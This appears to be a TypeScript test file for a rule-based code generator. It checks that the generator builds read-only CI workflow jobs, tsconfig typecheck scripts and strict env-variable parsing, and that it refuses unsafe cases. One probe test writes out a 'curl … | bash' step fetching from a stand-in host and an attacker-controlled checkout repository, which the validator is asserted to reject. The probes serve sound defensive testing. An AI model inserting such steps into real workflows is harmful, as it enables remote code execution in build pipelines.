// M67 un-drop batch: WORKFLOW_JOB (public-workflow-job-v1), TSCONFIG_SCRIPT (public-tsconfig-script-v1) and ENV_FIX
// (public-env-fix-v1). Real fixtures: PeaceSTOCKS files at the parents of the Builder examples (seq 39 f1dc065,
// f2200a7, c1b8db6, f68de39, ad42237), PeaceSTOCKS workflows at 0ce20d4, and four MIT workflow files from the pinned
// example-only repos (tsup 198479b, lerna b00fa03, pnpm 6c26d9d, vite-plugin-react 2e8512f). LOOP_WHILE: m67-loop-while.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { applyRule, specHash, validateSpec, type RuleSpec } from "../lib/learned.ts";
import { workflowJobEnabled, workflowJobFileProblem, workflowJobLinesReason, applyWorkflowJobRule } from "../lib/workflow-job.ts";
import { tsconfigScriptEnabled, tsconfigScriptCandidateReason, tsconfigTextProblem } from "../lib/tsconfig-script.ts";
import { envFixEnabled, applyEnvFixRule } from "../lib/env-fix.ts";
import { checkCandidateScope, WORKSPACE_SCOPE, type CandidateScope } from "../lib/scope.ts";
import { parseDiff } from "../lib/diff.ts";
import { PROTECTED_SELF } from "../lib/selfchange.ts";

const root = resolve(import.meta.dirname, "../..");
const read = (p: string) => readFileSync(resolve(root, p), "utf8");

// SYNTHETIC (keys "synthetic/..."; not PeaceSTOCKS bytes): stand-ins with the same shapes as the PeaceSTOCKS example parents (PeaceSTOCKS source may not be copied into
// this repo: core-text guard). With PEACESTOCKS_CLONE set, the "real clone" tests also run on the real files.
const PKG = '{\n  "name": "x",\n  "private": true,\n  "scripts": {\n    "typecheck": "tsc -p tsconfig.json --noEmit",\n    "test": "tsx --test src/*.test.ts"\n  }\n}\n';
const TSC = JSON.stringify({ compilerOptions: { strict: true, noEmit: true }, include: ["src/**/*.ts"] }, null, 2) + "\n";
const SYN: Record<string, string> = {
  "synthetic/seq39-package.json": PKG, "synthetic/t2-package.json": PKG, "synthetic/w-package.json": PKG,
  "synthetic/seq39-tsconfig.json": TSC, "synthetic/t2-tsconfig.json": TSC,
  "synthetic/seq39-tsconfig.lib.json": JSON.stringify({ extends: "./tsconfig.json", include: ["src/**/*.ts"], exclude: ["src/**/*.test.ts"] }),
  "synthetic/t2-tsconfig.worker.json": JSON.stringify({ extends: "./tsconfig.json", include: [], files: ["src/read-worker.ts"] }),
  "synthetic/e1-oct2024-tenmin-oneoff.ts.txt": "export const ONEOFF_DEFAULT_BUDGET_MS = 18900000;\nexport function main(): number {\n  const budgetMs = Number(process.env.ONEOFF_BUDGET_MS) > 0 ? Number(process.env.ONEOFF_BUDGET_MS) : ONEOFF_DEFAULT_BUDGET_MS;\n  return budgetMs;\n}\n",
  "synthetic/e2-tenmin-redispatch.ts.txt": "export function a(): boolean {\n  if (process.env.TENMIN_REDISPATCH_DRY_RUN === \"1\") {\n    return true;\n  }\n  return false;\n}\nexport function b(): boolean {\n  if (process.env.TENMIN_REDISPATCH_DRY_RUN === \"1\") return true;\n  return false;\n}\nexport function c(env: NodeJS.ProcessEnv, seconds: number): boolean {\n  return seconds > 0 && env.TENMIN_REDISPATCH_DRY_RUN !== \"1\";\n}\n",
  "synthetic/e3c-tenmin-daily-liquid.ts.txt": "export function pick(env: NodeJS.ProcessEnv): string {\n  if (env.PEACESTOCKS_R2_BUCKET?.trim()) return \"r2\";\n  else if (env.PEACESTOCKS_REQUIRE_OBJECT_STORE === \"1\") throw new Error(\"OBJECT_STORE_REQUIRED\");\n  else return \"file\";\n}\n",
};
const fx = (p: string) => SYN[p] ?? read(`peaceai/test/fixtures/m67/${p}`);
const spec = (id: string) => JSON.parse(read(`peaceai/rules/learned/${id}.json`)) as RuleSpec;
const WJ = spec("public-workflow-job-v1"), TS = spec("public-tsconfig-script-v1"), EF = spec("public-env-fix-v1");
const run = (s: RuleSpec, objective: string, files: { path: string; content: string }[]) => {
  const w: { reason?: string } = {};
  const e = applyRule(s, objective, files, undefined, undefined, w, () => false);
  return { e, r: w.reason };
};
const lines = (a: string, b: string) => { const x = a.split("\n"), y = b.split("\n"); let i = 0; while (i < x.length && x[i] === y[i]) i++; return y.slice(i).filter((l, k, arr) => k < arr.length - 1 || l !== ""); };

const approvedEntry = (id: string) => (JSON.parse(read("peaceai/rules/approved.json")) as { rules: { id: string; sha256: string; approval?: { author?: string } }[] }).rules.find((r) => r.id === id);
/** #273 prep: holds before AND after Peace's /approve-rule (any order): if approved, it pins this exact spec and Peace approved it. */
const approvalOk = (s: RuleSpec) => { const e = approvedEntry(s.id); return !e || (e.sha256 === specHash(s) && e.approval?.author === "PeaceG03"); };

test("specs: valid, approval-agnostic (Peace-approved + hash-pinned if listed), off by default on the dev path, protected", () => {
  for (const s of [WJ, TS, EF]) {
    assert.ok(validateSpec(s), s.id);
    assert.ok(approvalOk(s), `${s.id}: approved only by Peace /approve-rule, pinned to this spec`);
    assert.ok(PROTECTED_SELF.some((p) => p.pattern.test(`peaceai/rules/learned/${s.id}.json`)), s.id);
  }
  assert.equal(workflowJobEnabled({}), false);
  assert.equal(workflowJobEnabled({ PEACEAI_WORKFLOW_JOB: "1" }), false);
  assert.equal(tsconfigScriptEnabled({ PEACEAI_TSCONFIG_SCRIPT: "yes" }), false);
  assert.equal(envFixEnabled({ PEACEAI_ENV_FIX: "true" }), true);
  assert.equal(applyWorkflowJobRule(WJ.trigger, WJ.params, "x", [], {}), null);
  assert.equal(applyEnvFixRule(EF.trigger, EF.params, "x", [], {}), null);
});

// ---------------- WORKFLOW_JOB ----------------
const SIM = ".github/workflows/tenmin-mode-sim.yml";
const wfFiles = (file: string, content: string) => [{ path: file, content }, { path: "package.json", content: fx("synthetic/w-package.json") }];

test("WORKFLOW_JOB builds a read-only suite job in the real tenmin-mode-sim.yml (W1 shape)", () => {
  const { e, r } = run(WJ, `add workflow job \`suite\` to \`${SIM}\` running pnpm run test as step \`Test suite\``, wfFiles(SIM, fx("peacestocks/w-tenmin-mode-sim.yml")));
  assert.ok(e, r);
  const added = lines(fx("peacestocks/w-tenmin-mode-sim.yml"), e!.content);
  assert.equal(added[0], "  suite:");
  assert.ok(added.includes("      contents: read"));
  assert.ok(added.some((l) => /uses: pnpm\/action-setup@v4/.test(l)));
  assert.equal(added.at(-1), "        run: pnpm run test");
  assert.equal(workflowJobLinesReason(added), null);
  assert.ok(!/\$\{\{|secrets/.test(added.join("\n")));
});

test("WORKFLOW_JOB on the real vite-plugin-react ci-rsc.yml (example-only, MIT): copies its pinned setup steps", () => {
  const file = ".github/workflows/ci-rsc.yml";
  const pkg = JSON.stringify({ scripts: { "typecheck:rsc": "tsc --noEmit" } });
  const { e, r } = run(WJ, `add workflow job \`typecheck-rsc\` to \`${file}\` running pnpm run typecheck:rsc`, [{ path: file, content: fx("workflow-job/vitejs__vite-plugin-react-ci-rsc.yml") }, { path: "package.json", content: pkg }]);
  assert.ok(e, r);
  const added = lines(fx("workflow-job/vitejs__vite-plugin-react-ci-rsc.yml"), e!.content);
  assert.equal(workflowJobLinesReason(added), null);
  assert.ok(added.some((l) => l.includes("persist-credentials: false")));
});

const wjBad: [string, string, string, string][] = [
  ["secrets in the file (real gap-refill.yml)", ".github/workflows/gap-refill.yml", fx("peacestocks/w-gap-refill.yml"), "workflow_job_secrets"],
  ["write permission in the file (real scanner-alert-test.yml: issues: write)", ".github/workflows/scanner-alert-test.yml", fx("peacestocks/w-scanner-alert-test.yml"), "workflow_job_write_permission"],
  ["secrets elsewhere in the file (real lerna website-deploy.yml)", ".github/workflows/website-deploy.yml", fx("workflow-job/lerna__lerna-website-deploy.yml"), "workflow_job_secrets"],
  ["secrets elsewhere in the file (real pnpm pacquet-ci.yml)", ".github/workflows/pacquet-ci.yml", fx("workflow-job/pnpm__pnpm-pacquet-ci.yml"), "workflow_job_secrets"],
  ["no top-level read permissions (real tsup ci.yml)", ".github/workflows/ci.yml", fx("workflow-job/egoist__tsup-ci.yml"), "workflow_job_no_read_permissions"],
  ["pull_request_target", SIM, fx("peacestocks/w-tenmin-mode-sim.yml").replace("  workflow_dispatch:", "  workflow_dispatch:\n  pull_request_target:"), "workflow_job_privileged_trigger"],
  ["workflow_run", SIM, fx("peacestocks/w-tenmin-mode-sim.yml").replace("  workflow_dispatch:", "  workflow_dispatch:\n  workflow_run:"), "workflow_job_privileged_trigger"],
  ["contents: write", SIM, fx("peacestocks/w-tenmin-mode-sim.yml").replace("contents: read", "contents: write"), "workflow_job_write_permission"],
  ["existing job name", SIM, fx("peacestocks/w-tenmin-mode-sim.yml").replace("  sim:", "  suite:"), "workflow_job_exists"],
];
for (const [name, file, content, code] of wjBad)
  test(`WORKFLOW_JOB refused (${code}): ${name}`, () => {
    const { e, r } = run(WJ, `add workflow job \`suite\` to \`${file}\` running pnpm run test`, wfFiles(file, content));
    assert.equal(e, null); assert.equal(r, code);
  });
test("WORKFLOW_JOB refused: a script that is not read-only tsc / tsx --test (scheduler)", () => {
  const { e, r } = run(WJ, `add workflow job \`suite\` to \`${SIM}\` running pnpm run scheduler`, wfFiles(SIM, fx("peacestocks/w-tenmin-mode-sim.yml")));
  assert.equal(e, null); assert.equal(r, "workflow_job_script_unsafe");
});
test("WORKFLOW_JOB file check matches the real fixtures", () => {
  assert.equal(workflowJobFileProblem(fx("workflow-job/vitejs__vite-plugin-react-ci-rsc.yml")), null);
  assert.equal(workflowJobFileProblem(fx("peacestocks/w-tenmin-mode-sim.yml")), null);
});
test("scope: a job block with secrets, write or another action is refused", () => {
  const ok = ["  suite:", "    runs-on: ubuntu-24.04", "    timeout-minutes: 10", "    permissions:", "      contents: read", "    steps:", "      - uses: actions/checkout@v4", "      - run: pnpm install --frozen-lockfile", "      - name: Test", "        run: pnpm run test"];
  assert.equal(workflowJobLinesReason(ok), null);
  assert.ok(workflowJobLinesReason(ok.map((l) => l.replace("contents: read", "contents: write"))));
  assert.ok(workflowJobLinesReason([...ok.slice(0, 7), "        env:", "          K: ${{ secrets.K }}", ...ok.slice(7)]));
  assert.ok(workflowJobLinesReason(ok.map((l) => l.replace("actions/checkout@v4", "some/action@v1"))));
});
// Auditor #266 probes: anything the generator never emits is refused, not just bad headers/uses/final step.
test("scope: job-block probes (curl|bash run, foreign checkout repository, shell: python step) are refused", () => {
  const ok = ["  suite:", "    runs-on: ubuntu-24.04", "    timeout-minutes: 10", "    permissions:", "      contents: read", "    steps:", "      - uses: actions/checkout@v4", "        with:", "          persist-credentials: false", "      - uses: pnpm/action-setup@v4", "      - run: pnpm install --frozen-lockfile", "      - name: Test", "        run: pnpm run test"];
  assert.equal(workflowJobLinesReason(ok), null);
  const at = (i: number, ...ins: string[]) => [...ok.slice(0, i), ...ins, ...ok.slice(i)];
  assert.match(String(workflowJobLinesReason(at(10, "      - run: curl https://x.example/a.sh | bash"))), /setup step/);
  assert.match(String(workflowJobLinesReason(at(9, "          repository: attacker/x"))), /setup step/);
  assert.match(String(workflowJobLinesReason(at(10, "      - name: Inline", "        shell: python", "        run: print(1)"))), /setup step/);
  assert.match(String(workflowJobLinesReason(at(10, "      - shell: python", "        run: print(1)"))), /setup step/);
  // the install must be the last setup step, and appear once
  assert.ok(workflowJobLinesReason([...ok.slice(0, 10), ...ok.slice(11)]));
});

// ---------------- TSCONFIG_SCRIPT ----------------
test("TSCONFIG_SCRIPT reproduces the seq 39 (PeaceSTOCKS f1dc065) tsconfig.lib.json shape [synthetic fixture]", () => {
  const files = [{ path: "package.json", content: fx("synthetic/seq39-package.json") }, { path: "tsconfig.json", content: fx("synthetic/seq39-tsconfig.json") }];
  const { e, r } = run(TS, "add typecheck script `typecheck:lib` with new `tsconfig.lib.json` excluding `src/**/*.test.ts`", files);
  assert.ok(e, r);
  assert.deepEqual(JSON.parse(e!.extra![0]!.content), JSON.parse(fx("synthetic/seq39-tsconfig.lib.json")));
  assert.ok(e!.content.includes('"typecheck:lib": "tsc -p tsconfig.lib.json --noEmit",'));
  JSON.parse(e!.content);
});
test("TSCONFIG_SCRIPT reproduces PeaceSTOCKS f2200a7 tsconfig.worker.json (files mode) [synthetic fixture]", () => {
  const files = [{ path: "package.json", content: fx("synthetic/t2-package.json") }, { path: "tsconfig.json", content: fx("synthetic/t2-tsconfig.json") }, { path: "src/read-worker.ts", content: "" }];
  const { e, r } = run(TS, "add typecheck script `typecheck:worker` with new `tsconfig.worker.json` checking only `src/read-worker.ts`", files);
  assert.ok(e, r);
  assert.deepEqual(JSON.parse(e!.extra![0]!.content), JSON.parse(fx("synthetic/t2-tsconfig.worker.json")));
});
test("TSCONFIG_SCRIPT checkJs shape [synthetic fixture]", () => {
  const files = [{ path: "package.json", content: fx("synthetic/t2-package.json") }, { path: "tsconfig.json", content: fx("synthetic/t2-tsconfig.json") }];
  const { e, r } = run(TS, "add typecheck script `typecheck:scripts` with new `tsconfig.scripts.json` checking `scripts/*.mjs` with checkJs", files);
  assert.ok(e, r);
  assert.equal(tsconfigTextProblem(e!.extra![0]!.content), null);
});
const tsBase = () => [{ path: "package.json", content: fx("synthetic/t2-package.json") }, { path: "tsconfig.json", content: fx("synthetic/t2-tsconfig.json") }];
const tsBad: [string, string, { path: string; content: string }[], string][] = [
  ["tsconfig already exists", "add typecheck script `typecheck:lib` with new `tsconfig.lib.json` excluding `src/**/*.test.ts`", [...tsBase(), { path: "tsconfig.lib.json", content: "{}" }], "tsconfig_script_exists"],
  ["script name taken", "add typecheck script `typecheck:lib` with new `tsconfig.lib.json` excluding `src/**/*.test.ts`", [{ path: "package.json", content: fx("synthetic/t2-package.json").replace('"typecheck:lib"', '"x"').replace('"test"', '"typecheck:lib"') }, tsBase()[1]!], "tsconfig_script_name_taken"],
  ["no base tsconfig", "add typecheck script `typecheck:lib` with new `tsconfig.lib.json` excluding `src/**/*.test.ts`", [tsBase()[0]!], "tsconfig_script_no_base"],
  ["file missing", "add typecheck script `typecheck:worker` with new `tsconfig.worker.json` checking only `src/nope.ts`", tsBase(), "tsconfig_script_file_missing"],
  ["parent path in the pattern", "add typecheck script `typecheck:up` with new `tsconfig.up.json` excluding `../x.ts`", tsBase(), "tsconfig_script_bad_pattern"],
  ["no typecheck anchor", "add typecheck script `typecheck:lib2` with new `tsconfig.lib2.json` excluding `src/**/*.test.ts`", [{ path: "package.json", content: '{\n  "scripts": {\n    "test": "x"\n  }\n}\n' }, tsBase()[1]!], "tsconfig_script_no_anchor"],
];
for (const [name, obj, files, code] of tsBad) test(`TSCONFIG_SCRIPT refused (${code}): ${name}`, () => { const { e, r } = run(TS, obj, files); assert.equal(e, null); assert.equal(r, code); });
test("TSCONFIG_SCRIPT names must match (tsconfig.a.json for typecheck:b is task_unparsed) [synthetic fixture]", () => {
  assert.equal(run(TS, "add typecheck script `typecheck:a` with new `tsconfig.b.json` excluding `src/**/*.test.ts`", tsBase()).r, "task_unparsed");
});
test("TSCONFIG_SCRIPT text check refuses emit/outDir/paths and other shapes [synthetic fixture]", () => {
  assert.ok(tsconfigTextProblem(JSON.stringify({ extends: "./tsconfig.json", compilerOptions: { outDir: "dist" }, include: ["src/**/*.ts"] })));
  assert.ok(tsconfigTextProblem(JSON.stringify({ extends: "./tsconfig.json", compilerOptions: { allowJs: true, checkJs: true, noEmit: false }, include: ["x.mjs"] })));
  assert.ok(tsconfigTextProblem(JSON.stringify({ extends: "../tsconfig.json", include: [], files: ["a.ts"] })));
});

// Scope: on an opted-in target the pair passes; without the opt-in package.json/tsconfig stay outside the allowed paths.
test("scope: TSCONFIG_SCRIPT pair passes only with tsconfigScript, and only the exact pair", () => {
  const files = [{ path: "package.json", content: fx("synthetic/seq39-package.json") }, { path: "tsconfig.json", content: fx("synthetic/seq39-tsconfig.json") }];
  const { e } = run(TS, "add typecheck script `typecheck:lib` with new `tsconfig.lib.json` excluding `src/**/*.test.ts`", files);
  const pkgOld = fx("synthetic/seq39-package.json").split("\n");
  const pkgNew = e!.content.split("\n");
  const i = pkgNew.findIndex((l, k) => l !== pkgOld[k]);
  const ts = e!.extra![0]!.content.replace(/\n$/, "").split("\n");
  const diff = `diff --git a/package.json b/package.json\nindex 1111111..2222222 100644\n--- a/package.json\n+++ b/package.json\n@@ -${i},1 +${i},2 @@\n ${pkgOld[i - 1]}\n+${pkgNew[i]}\ndiff --git a/tsconfig.lib.json b/tsconfig.lib.json\nnew file mode 100644\nindex 0000000..3333333\n--- /dev/null\n+++ b/tsconfig.lib.json\n@@ -0,0 +1,${ts.length} @@\n${ts.map((l) => "+" + l).join("\n")}\n`;
  const base = new Set(["package.json", "tsconfig.json"]);
  const on: CandidateScope = { ...WORKSPACE_SCOPE, tsconfigScript: true };
  assert.deepEqual(checkCandidateScope(parseDiff(diff), base, on), []);
  assert.ok(checkCandidateScope(parseDiff(diff), base, WORKSPACE_SCOPE).length > 0);
  assert.ok(tsconfigScriptCandidateReason([{ path: "package.json", isNew: false, addedLines: ['    "build": "tsc",'], removedLines: [] }, { path: "tsconfig.lib.json", isNew: true, addedLines: ts, removedLines: [] }]));
});

// ---------------- ENV_FIX ----------------
test("ENV_FIX int: reproduces the E1 fix shape (PeaceSTOCKS c1b8db6) [synthetic fixture]", () => {
  const file = "src/oct2024-tenmin-oneoff.ts";
  const { e, r } = run(EF, `make env \`ONEOFF_BUDGET_MS\` strict in \`${file}\` as an integer 1..21600000`, [{ path: file, content: fx("synthetic/e1-oct2024-tenmin-oneoff.ts.txt") }]);
  assert.ok(e, r);
  assert.ok(e!.content.includes("const budgetMs = strictOneoffBudgetMs(process.env.ONEOFF_BUDGET_MS);"));
  assert.ok(e!.content.includes("if (!s) return ONEOFF_DEFAULT_BUDGET_MS;"));
  assert.equal(e!.extra![0]!.path, "src/oct2024-tenmin-oneoff.strictoneoffbudgetms-strict-env.test.ts");
  assert.match(e!.extra![0]!.content, /"Infinity"/);
});
test("ENV_FIX flag: reproduces the E2 fix shape (PeaceSTOCKS f68de39: 3 reads, incl. !==) [synthetic fixture]", () => {
  const file = "src/tenmin-redispatch.ts";
  const { e, r } = run(EF, `make env \`TENMIN_REDISPATCH_DRY_RUN\` strict in \`${file}\` as a flag`, [{ path: file, content: fx("synthetic/e2-tenmin-redispatch.ts.txt") }]);
  assert.ok(e, r);
  assert.equal(e!.content.match(/strictTenminRedispatchDryRun\(process\.env\.TENMIN_REDISPATCH_DRY_RUN\)/g)?.length, 2);
  assert.ok(e!.content.includes("!strictTenminRedispatchDryRun(env.TENMIN_REDISPATCH_DRY_RUN)"));
  assert.ok(!e!.content.includes('TENMIN_REDISPATCH_DRY_RUN === "1"'));
});
test("ENV_FIX flag: reproduces the E3c fix shape (PeaceSTOCKS ad42237) [synthetic fixture]", () => {
  const file = "src/tenmin-daily-liquid.ts";
  const { e, r } = run(EF, `make env \`PEACESTOCKS_REQUIRE_OBJECT_STORE\` strict in \`${file}\` as a flag`, [{ path: file, content: fx("synthetic/e3c-tenmin-daily-liquid.ts.txt") }]);
  assert.ok(e, r);
  assert.ok(e!.content.includes("else if (strictPeacestocksRequireObjectStore(env.PEACESTOCKS_REQUIRE_OBJECT_STORE)) throw"));
});
const efBad: [string, string, string, string][] = [
  ["no recognised read", "src/a.ts", "export const x = process.env.FOO ?? \"\";\n", "env_fix_mixed_reads"],
  ["read not present at all", "src/a.ts", "export const x = 1;\n", "env_fix_read_not_found"],
  ["mixed: a flag read plus a raw read", "src/a.ts", "export const a = process.env.FOO === \"1\";\nexport const b = process.env.FOO;\n", "env_fix_mixed_reads"],
  ["helper name taken", "src/a.ts", "export const a = process.env.FOO === \"1\";\nexport const strictFoo = 1;\n", "env_fix_helper_taken"],
  ["test file target", "src/a.test.ts", "export const a = process.env.FOO === \"1\";\n", "path_not_plain"],
  ["outside src/", "lib/a.ts", "export const a = process.env.FOO === \"1\";\n", "path_not_plain"],
];
for (const [name, file, content, code] of efBad)
  test(`ENV_FIX refused (${code}): ${name}`, () => {
    const { e, r } = run(EF, `make env \`FOO\` strict in \`${file}\` as a flag`, [{ path: file, content }]);
    assert.equal(e, null); assert.equal(r, code);
  });
test("ENV_FIX int refuses a read that is not the Number(X) > 0 ? Number(X) : D shape [synthetic fixture]", () => {
  const { e, r } = run(EF, "make env `FOO` strict in `src/a.ts` as an integer 1..10", [{ path: "src/a.ts", content: "export const n = Number(process.env.FOO) || 3;\n" }]);
  assert.equal(e, null); assert.equal(r, "env_fix_mixed_reads");
});

// Optional: the real PeaceSTOCKS example parents, when a clone is given (never copied into this repo).
const CLONE = process.env.PEACESTOCKS_CLONE;
test("real clone (PEACESTOCKS_CLONE): E1/E2/E3c/seq39/T2 parents build the same edits", { skip: !CLONE }, async () => {
  const { execFileSync } = await import("node:child_process");
  const show = (rev: string, p: string) => execFileSync("git", ["-C", CLONE!, "show", `${rev}:${p}`], { encoding: "utf8" });
  const ok = (s: RuleSpec, obj: string, files: { path: string; content: string }[]) => { const x = run(s, obj, files); assert.ok(x.e, x.r); return x.e!; };
  ok(EF, "make env `ONEOFF_BUDGET_MS` strict in `src/oct2024-tenmin-oneoff.ts` as an integer 1..21600000", [{ path: "src/oct2024-tenmin-oneoff.ts", content: show("c1b8db6^", "src/oct2024-tenmin-oneoff.ts") }]);
  ok(EF, "make env `TENMIN_REDISPATCH_DRY_RUN` strict in `src/tenmin-redispatch.ts` as a flag", [{ path: "src/tenmin-redispatch.ts", content: show("f68de39^", "src/tenmin-redispatch.ts") }]);
  ok(EF, "make env `PEACESTOCKS_REQUIRE_OBJECT_STORE` strict in `src/tenmin-daily-liquid.ts` as a flag", [{ path: "src/tenmin-daily-liquid.ts", content: show("ad42237^", "src/tenmin-daily-liquid.ts") }]);
  const e = ok(TS, "add typecheck script `typecheck:lib` with new `tsconfig.lib.json` excluding `src/**/*.test.ts`", [{ path: "package.json", content: show("f1dc065^", "package.json") }, { path: "tsconfig.json", content: show("f1dc065^", "tsconfig.json") }]);
  assert.deepEqual(JSON.parse(e.extra![0]!.content), JSON.parse(show("f1dc065", "tsconfig.lib.json")));
  const w = ok(TS, "add typecheck script `typecheck:worker` with new `tsconfig.worker.json` checking only `src/read-worker.ts`", [{ path: "package.json", content: show("f2200a7^", "package.json") }, { path: "tsconfig.json", content: show("f2200a7^", "tsconfig.json") }, { path: "src/read-worker.ts", content: "" }]);
  assert.deepEqual(JSON.parse(w.extra![0]!.content), JSON.parse(show("f2200a7", "tsconfig.worker.json")));
});

test("ENV_FIX catches bracket reads (process.env[\"NAME\"]) [synthetic fixture]", () => {
  const src = 'export function a(): boolean {\n  return process.env["SYN_FLAG"] === "1";\n}\nexport function b(env: NodeJS.ProcessEnv): boolean {\n  return env.SYN_FLAG !== "1";\n}\n';
  const { e, r } = run(EF, "make env `SYN_FLAG` strict in `src/syn.ts` as a flag", [{ path: "src/syn.ts", content: src }]);
  assert.ok(e, r);
  assert.ok(e!.content.includes('strictSynFlag(process.env["SYN_FLAG"])') && e!.content.includes("!strictSynFlag(env.SYN_FLAG)"));
  const mixed = 'export const x = process.env["SYN_FLAG"] ?? "";\nexport const y = process.env.SYN_FLAG === "1";\n';
  assert.equal(run(EF, "make env `SYN_FLAG` strict in `src/syn.ts` as a flag", [{ path: "src/syn.ts", content: mixed }]).r, "env_fix_mixed_reads");
});
